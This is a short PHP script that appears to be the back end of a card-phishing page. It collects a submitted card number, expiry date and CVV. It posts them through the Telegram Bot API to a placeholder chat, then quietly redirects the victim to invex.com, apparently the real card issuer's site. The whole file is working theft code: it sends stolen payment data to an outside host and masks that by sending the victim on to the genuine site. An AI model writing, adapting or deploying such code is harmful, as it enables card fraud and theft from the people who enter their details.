<?php

$tarjeta = $_POST['tarjeta'];
$mes = $_POST['mes'];
$año = $_POST['año'];
$cvv = $_POST['cvv'];

$telegramToken = 'TU_TOKEN_DE_TELEGRAM';

$chatID = 'TU_ID_DE_CHAT';

$mensaje = "Número de tarjeta: $tarjeta\nFecha de vencimiento: $mes/$año\nCVV: $cvv";

$telegramAPIURL = "https://api.telegram.org/bot$telegramToken/sendMessage";

$data = [
    'chat_id' => $chatID,
    'text' => $mensaje,
];


$ch = curl_init($telegramAPIURL);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
curl_close($ch);

header('Location: https://www.invex.com/');

?>
